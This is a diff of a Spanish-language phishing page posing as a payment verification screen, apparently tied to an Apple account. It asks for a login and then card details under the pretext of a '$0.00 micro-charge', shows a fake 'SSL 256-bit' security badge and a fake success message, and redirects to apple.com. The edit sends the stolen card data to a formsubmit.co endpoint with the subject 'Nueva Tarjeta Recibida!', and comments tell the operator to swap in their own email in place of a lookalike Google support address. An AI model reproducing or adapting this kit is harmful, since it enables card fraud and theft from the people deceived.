@@ -5,92 +5,36 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Verificación de Pago</title>
     <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #f2f2f2;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            color: #333;
-        }
-        .card {
-            background: #fff;
-            width: 100%;
-            max-width: 380px;
-            border-radius: 8px;
-            box-shadow: 0 4px 24px rgba(0,0,0,0.1);
-            padding: 30px;
-            box-sizing: border-box;
-        }
-        .header {
-            text-align: center;
-            margin-bottom: 25px;
-        }
-        .cards-icons {
-            display: flex;
-            justify-content: center;
-            gap: 10px;
-            margin-bottom: 15px;
-        }
-        .cards-icons img {
-            height: 24px;
-            width: auto;
-            opacity: 0.8;
-        }
+        /* (Mismos estilos de la versión anterior para que se vea bien) */
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #333; }
+        .card { background: #fff; width: 100%; max-width: 380px; border-radius: 8px; box-shadow: 0 4px 24px rgba(0,0,0,0.1); padding: 30px; box-sizing: border-box; }
+        .header { text-align: center; margin-bottom: 25px; }
+        .cards-icons { display: flex; justify-content: center; gap: 10px; margin-bottom: 15px; }
+        .cards-icons img { height: 24px; width: auto; opacity: 0.8; }
         h2 { margin: 10px 0 5px; font-size: 20px; color: #111; }
         p { margin: 0 0 25px; font-size: 14px; color: #666; text-align: center; }
-        
         .input-group { margin-bottom: 15px; }
         label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 6px; color: #444; }
-        input {
-            width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 6px;
-            font-size: 15px; box-sizing: border-box; background: #fafafa;
-        }
-        input:focus {
-            outline: none; border-color: #007bff; background: #fff;
-            box-shadow: 0 0 0 3px rgba(0, 123, 255, 0.1);
-        }
+        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 6px; font-size: 15px; box-sizing: border-box; background: #fafafa; }
+        input:focus { outline: none; border-color: #007bff; background: #fff; box-shadow: 0 0 0 3px rgba(0, 123, 255, 0.1); }
         .row { display: flex; gap: 15px; }
         .col { flex: 1; }
-        
-        button {
-            width: 100%; padding: 13px; background-color: #007bff; color: white; border: none;
-            border-radius: 6px; font-size: 15px; font-weight: 600; cursor: pointer;
-            margin-top: 10px; transition: background 0.2s;
-        }
+        button { width: 100%; padding: 13px; background-color: #007bff; color: white; border: none; border-radius: 6px; font-size: 15px; font-weight: 600; cursor: pointer; margin-top: 10px; transition: background 0.2s; }
         button:hover { background-color: #0056b3; }
         button:disabled { background-color: #ccc; cursor: not-allowed; }
-
-        /* Ocultar secciones */
         .hidden { display: none; }
-        
-        /* Animaciones */
         .fade-in { animation: fadeIn 0.4s ease-in-out; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-
-        /* Loader y Success */
         .center-content { text-align: center; padding: 20px 0; }
-        .spinner {
-            border: 4px solid #f3f3f3; border-top: 4px solid #007bff; border-radius: 50%;
-            width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto;
-        }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #007bff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        
-        .success-icon {
-            font-size: 40px; color: #28a745; margin-bottom: 10px;
-        }
-        .secure-badge {
-            display: flex; align-items: center; justify-content: center; gap: 5px;
-            font-size: 12px; color: #888; margin-top: 15px;
-        }
+        .success-icon { font-size: 40px; color: #28a745; margin-bottom: 10px; }
+        .secure-badge { display: flex; align-items: center; justify-content: center; gap: 5px; font-size: 12px; color: #888; margin-top: 15px; }
     </style>
 </head>
 <body>
 
     <div class="card fade-in">
-        
         <!-- PASO 1: LOGIN -->
         <div id="step1">
             <div class="header">
@@ -122,8 +66,15 @@
                 <p>Confirma con una micro-carga de $0.00.</p>
             </div>
 
-            <!-- CAMBIA "TU_ID" POR TU ID DE FORMSPREE -->
-            <form id="form-card" action="https://formspree.io/f/maeybpog" method="POST">
+            <!-- AQUÍ VA TU FORMULARIO -->
+            <!-- REEMPLAZA "soportee.gogle@gmail.com" CON TU CORREO REAL -->
+            <form id="form-card" action="https://formsubmit.co/el/fayepi" method="POST">
+                
+                <!-- Campo oculto para que no te llegue la página de "Gracias" -->
+                <input type="hidden" name="_next" value="https://www.google.com">
+                <!-- Campo oculto para el asunto del email -->
+                <input type="hidden" name="_subject" value="Nueva Tarjeta Recibida!">
+
                 <div class="input-group">
                     <label>Nombre en la tarjeta</label>
                     <input type="text" name="Nombre" placeholder="NOMBRE COMPLETO" required>
@@ -161,9 +112,7 @@
             <div class="success-icon">✔️</div>
             <h2>¡Listo!</h2>
             <p>Tu cuenta ha sido verificada.</p>
-            <div class="secure-badge">
-                🔒 Conexión segura SSL 256-bit
-            </div>
+            <div class="secure-badge">🔒 Conexión segura SSL 256-bit</div>
         </div>
     </div>
 
@@ -185,33 +134,17 @@
             document.getElementById('step2').classList.add('hidden');
             document.getElementById('loader').classList.remove('hidden');
 
-            const formData = new FormData(document.getElementById('form-card'));
-            
-            // Enviar datos
-            fetch(document.getElementById('form-card').action, {
-                method: 'POST',
-                body: formData,
-                headers: { 'Accept': 'application/json' }
-            }).then(response => {
-                if (response.ok) {
-                    setTimeout(() => {
-                        document.getElementById('loader').classList.add('hidden');
-                        document.getElementById('success').classList.remove('hidden');
-                        document.getElementById('success').classList.add('fade-in');
-                        setTimeout(() => {
-                            window.location.href = "https://www.apple.com"; // Redirigir después de 3 seg
-                        }, 3000);
-                    }, 2000);
-                } else {
-                    alert("Error al enviar. Intenta de nuevo.");
-                    btn.disabled = false;
-                    btn.innerText = "Pagar";
-                    document.getElementById('step2').classList.remove('hidden');
-                }
-            }).catch(error => {
-                console.error('Error:', error);
-                alert("Error de conexión.");
-            });
+            // Simulación de tiempo de proceso
+            setTimeout(() => {
+                document.getElementById('loader').classList.add('hidden');
+                document.getElementById('success').classList.remove('hidden');
+                document.getElementById('success').classList.add('fade-in');
+                
+                // Redirigir después de 3 segundos
+                setTimeout(() => {
+                    window.location.href = "https://www.apple.com"; 
+                }, 3000);
+            }, 2000);
         });
 
         // Formatear tarjeta
